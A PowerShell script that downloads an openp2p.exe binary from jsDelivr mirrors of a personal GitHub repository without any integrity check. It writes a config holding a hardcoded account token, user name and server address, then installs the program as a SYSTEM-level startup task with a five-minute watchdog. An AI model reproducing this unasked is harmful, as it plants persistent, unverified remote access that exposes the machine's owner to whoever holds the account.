# comment (ascii only)
# comment (ascii only)
param([Parameter(Mandatory=$true)][string]$Node)
$ErrorActionPreference = 'Continue'
$dir = 'C:\openp2p'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$L = { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m) }

# comment (ascii only)
$mirrors = @(
  'https://fastly.jsdelivr.net/gh/jjohnhee/k',
  'https://gcore.jsdelivr.net/gh/jjohnhee/k',
  'https://testingcf.jsdelivr.net/gh/jjohnhee/k'
)
$exe = Join-Path $dir 'openp2p.exe'
if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 4000000) {
  foreach ($m in $mirrors) {
    $tmpZip = Join-Path $dir 'opp.zip'
    curl.exe -sS -o $tmpZip ($m + '/openp2p-win.zip')
    if ((Test-Path $tmpZip) -and ((Get-Item $tmpZip).Length -gt 4000000)) { Move-Item $tmpZip $exe -Force }
    if ((Test-Path $exe) -and ((Get-Item $exe).Length -gt 4000000)) { & $L ("exe OK via " + $m); break }
  }
} else { & $L 'exe already present' }

# comment (ascii only)
$config = @"
{
  "network": {
    "Token": 1268210438431465255,
    "Node": "$Node",
    "User": "xunAwe007",
    "ShareBandwidth": 10,
    "ServerHost": "api.openp2p.cn",
    "ServerIP": "124.221.80.223",
    "ServerPort": 27183
  },
  "apps": []
}
"@
Set-Content -Path (Join-Path $dir 'config.json') -Value $config -Encoding UTF8
& $L 'config written'

# comment (ascii only)
schtasks /Create /TN openp2p /SC ONSTART /TR "C:\openp2p\openp2p.exe -d" /RU SYSTEM /RL HIGHEST /F | Out-Null
schtasks /End /TN openp2p 2>$null | Out-Null
Get-Process openp2p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
schtasks /Run /TN openp2p
Start-Sleep -Seconds 5
$p = Get-Process openp2p -ErrorAction SilentlyContinue
if ($p) { & $L ("openp2p RUNNING pid=" + ($p.Id -join ',')) } else { & $L 'openp2p NOT-RUNNING' }

# comment (ascii only)
$wd = Join-Path $dir 'watchdog.cmd'
Set-Content -Path $wd -Value "@echo off`r`ntasklist /FI `"IMAGENAME eq openp2p.exe`" | findstr openp2p >nul 2>&1 || start `"`" /MIN `"C:\openp2p\openp2p.exe`" -d" -Encoding ASCII
schtasks /Create /TN openp2p-watch /SC MINUTE /MO 5 /TR "C:\openp2p\watchdog.cmd" /RU SYSTEM /RL HIGHEST /F | Out-Null
schtasks /Run /TN openp2p-watch | Out-Null
& $L 'watchdog on (5min)'
